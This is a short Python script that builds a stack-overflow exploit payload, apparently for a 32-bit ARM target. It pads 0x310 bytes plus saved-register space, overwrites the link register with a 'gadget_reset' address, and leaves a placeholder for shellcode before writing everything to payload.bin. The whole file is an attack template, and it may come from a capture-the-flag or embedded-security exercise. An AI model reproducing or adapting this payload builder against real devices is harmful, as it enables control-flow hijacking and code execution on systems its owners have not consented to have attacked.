import struct

gadget_reset = 0x101

padbyte = b'A'
pad_to_saved_frame_info = 0x310 * padbyte
pad_to_skip_callee_save_regs = (0x5 * 0x4) * padbyte
modified_lr = struct.pack('<I', gadget_reset) # <modified lr address here>
payload = b'' # shellcode here

final_payload = pad_to_saved_frame_info + pad_to_skip_callee_save_regs + modified_lr + payload

with open('payload.bin', 'wb') as fs:
    fs.write(final_payload)
